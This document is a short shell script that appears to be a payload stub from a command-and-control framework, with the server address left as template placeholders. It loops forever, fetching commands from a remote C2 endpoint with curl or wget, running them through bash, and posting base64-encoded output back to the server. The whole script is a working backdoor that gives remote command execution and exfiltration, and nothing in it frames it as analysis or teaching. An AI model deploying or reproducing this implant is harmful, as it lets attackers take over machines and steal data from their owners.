#!/bin/sh
C2_URL="__SCHEME__://__HOSTNAME__$(echo __PATH__ | sed -E 's#/[^/]+$##')"

if which curl > /dev/null
then
  DRIVER="curl"
elif which wget > /dev/null
then
  DRIVER="wget"
else
  exit 1
fi

while [ true ]
do
  if [ "${DRIVER}" = "curl" ]
  then
    CMD=$(curl -s "${C2_URL}/get_cmd")
  elif [ "${DRIVER}" = "wget" ]
  then
    CMD=$(wget -q -O- "${C2_URL}/get_cmd")
  fi
  if [ ! -z "$CMD" ]
  then
    ID=$(echo $CMD | cut -d, -f 1)
    FG=$(echo $CMD | cut -d, -f 2)
    CMD=$(echo $CMD | cut -d, -f 3-)
    if [ ! "$FG" = "false" ]
    then
      if [ "${DRIVER}" = "curl" ]
      then
        echo "$CMD" | bash | base64 | curl -s -d @- "${C2_URL}/put_result?id=${ID}"
      elif [ "${DRIVER}" = "wget" ]
      then
        echo "$CMD" | bash | base64 > /tmp/c2file
        wget -q --post-file=/tmp/c2file "${C2_URL}/put_result?id=${ID}"
        rm /tmp/c2file
      fi
    else
      echo "$CMD" | bash &
    fi
  else
    sleep 5
  fi
done
